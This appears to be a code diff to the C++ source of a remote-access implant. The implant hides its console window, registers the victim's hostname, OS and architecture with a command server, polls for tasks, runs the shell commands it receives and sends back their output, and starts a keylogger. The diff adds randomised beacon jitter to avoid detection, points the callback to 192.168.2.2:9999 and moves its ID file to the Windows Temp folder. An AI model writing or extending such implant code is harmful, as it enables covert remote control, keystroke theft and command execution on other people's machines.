@@ -5,24 +5,24 @@
 #include <cstdio>
 #include <cstring>
 #include <pthread.h>
-
-
+#include <time.h>  
+#include "./includes/cJSON/cJSON.h"
 
 
 #ifdef _WIN32
     #include <winsock2.h>
     #include "./includes/keylogger.h"
     #include <windows.h>
-    #include "./includes/cJSON/cJSON.h"
+    
     #include <unistd.h>
     //#include <Iphlpapi.h>
     //#include <Assert.h>
     //#pragma comment(lib, "iphlpapi.lib")
     //#pragma comment(lib, "ws2_32.lib")
     //#pragma comment(lib, "Secur32.lib")
-    #define file_path "Z:\\tmp\\id"
+    #define file_path "\\windows\\Temp\\id"
 #else
-    #include <cjson/cJSON.h>
+    //#include <cjson/cJSON.h>
     #include <sys/utsname.h>
     #include <sys/ioctl.h>
     #include <net/if.h>
@@ -33,14 +33,27 @@
 #endif
 
 #define PORT 9999
-#define ADDR "127.0.0.1"
+#define ADDR "192.168.2.2"
 #define BUFFER_SIZE 4096
 #define MAX_RESPONSE 0x20000
+
+
+
+int jitter() {
+    srand(time(0));  // Seed the random number generator
+
+    // Define the range (3 hours to 3 days in seconds)
+    const int MIN_SECONDS = 3 * 3600;   // 3 hours (3 * 60 * 60)
+    const int MAX_SECONDS = 3 * 86400;  // 3 days (3 * 24 * 60 * 60)
+
+    //return MIN_SECONDS + rand() % (MAX_SECONDS - MIN_SECONDS + 1);
+    return (rand() % 0xfff ) + 0xff;
+}
+
 
 class Device {
     public:
     void hideConsole();
-    const char* get_MAC();
     const char* get_Arch();
 };
 
@@ -57,29 +70,35 @@ class Communicate_ {
 };
 
 
+
 int main() {
     Communicate_ comm;
     Device d;
     #ifdef _WIN32
     d.hideConsole();
     #endif
+
     while (1) {
         if (comm.conn() == -1) {
-            sleep(300); // use random for 
+            sleep(jitter()); // use random for 
             continue;
         }
         int file = open(file_path, O_RDONLY);
         if (file == -1) {
+            //register
             comm.reg(d);
-            sleep(300);
+            sleep(jitter());
             continue;
         }
+
         char id[BUFFER_SIZE];
         read(file, id, sizeof(id));
+
         // check if agent_id file exists
         comm.beacon(id);
-        sleep(5);
+        sleep(jitter());
     }
+    
     return 0;
 }
 
@@ -134,51 +153,6 @@ void Device::hideConsole() {
     ShowWindow(stealth, 0);
 }
 #endif
-
-// change
-const char* Device::get_MAC() {
-    return "hello";
-}
-/*
-const char* Device::get_MAC() {
-    PIP_ADAPTER_INFO AdapterInfo;
-    DWORD dwBufLen = sizeof(IP_ADAPTER_INFO);
-    char *mac_addr = (char*)malloc(18);
-  
-    AdapterInfo = (IP_ADAPTER_INFO *) malloc(sizeof(IP_ADAPTER_INFO));
-    if (AdapterInfo == NULL) {
-      free(mac_addr);
-      return NULL; // it is safe to call free(NULL)
-    }
-
-    if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == ERROR_BUFFER_OVERFLOW) {
-      free(AdapterInfo);
-      AdapterInfo = (IP_ADAPTER_INFO *) malloc(dwBufLen);
-      if (AdapterInfo == NULL) {
-        free(mac_addr);
-        return NULL;
-      }
-    }
-  
-    if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == NO_ERROR) {
-      // Contains pointer to current adapter info
-      PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;
-      do {
-        // technically should look at pAdapterInfo->AddressLength
-        //   and not assume it is 6.
-        sprintf(mac_addr, "%02X:%02X:%02X:%02X:%02X:%02X",
-          pAdapterInfo->Address[0], pAdapterInfo->Address[1],
-          pAdapterInfo->Address[2], pAdapterInfo->Address[3],
-          pAdapterInfo->Address[4], pAdapterInfo->Address[5]);
-
-        printf("\n");
-        pAdapterInfo = pAdapterInfo->Next;        
-      } while(pAdapterInfo);                        
-    }
-    free(AdapterInfo);
-    return mac_addr;
-}
-*/
 
 
 const char* Device::get_Arch() {
@@ -250,9 +224,18 @@ void Communicate_::beacon(const char *id) {
         //pthread_create(&KeyloggerThread, NULL, StartLinuxKeylogger, NULL);
         //pthread_join(KeyloggerThread, NULL);
         #endif
+        strcpy(result, "Started keylogger Successfully");
 
-        
-    }
+        cJSON_AddStringToObject(re, "mode", "result");
+        cJSON_AddStringToObject(re, "agent_id", id);
+        cJSON_AddNumberToObject(re, "task_id", task_id->valueint);
+        cJSON_AddStringToObject(re, "response", result);
+        char *result_ = cJSON_Print(re);
+        send(sock, result_, strlen(result_), 0);
+        cJSON_Delete(re);
+        free(result_);
+        return;
+    }   
 
     memset(buffer, 0, sizeof(buffer));
     snprintf(command_with_redirect, sizeof(command_with_redirect), "%s 2>&1", cmd->valuestring);
@@ -280,6 +263,7 @@ void Communicate_::beacon(const char *id) {
     char *result_ = cJSON_Print(re);
     send(sock, result_, strlen(result_), 0);
     fclose(exec);
+    
     cJSON_Delete(re);
     free(result_);
 }
@@ -289,8 +273,7 @@ void Communicate_::reg(Device d) {
     char os[BUFFER_SIZE];
 
     if (gethostname(hostname, sizeof(hostname)) != 0) snprintf(hostname, sizeof(hostname), "Unknown");
-    const char *arch = d.get_Arch();
-    const char *mac = d.get_MAC();    
+    const char *arch = d.get_Arch(); 
     #ifdef _WIN32
     snprintf(os,sizeof(os), "%s", "windows");
     #else
@@ -299,7 +282,6 @@ void Communicate_::reg(Device d) {
     cJSON *reg = cJSON_CreateObject();
     cJSON_AddStringToObject(reg, "mode", "register");
     cJSON_AddStringToObject(reg, "os", os);
-    cJSON_AddStringToObject(reg, "mac", mac);
     cJSON_AddStringToObject(reg, "hostname", hostname);
     cJSON_AddStringToObject(reg, "arch", arch);
     //#ifdef _WIN32
@@ -325,7 +307,7 @@ void Communicate_::reg(Device d) {
     STORE_ID:
     FILE *f = fopen(file_path, "w");
     if (!f) {
-        sleep(3000);
+        sleep(jitter());
         goto STORE_ID;
     }
 
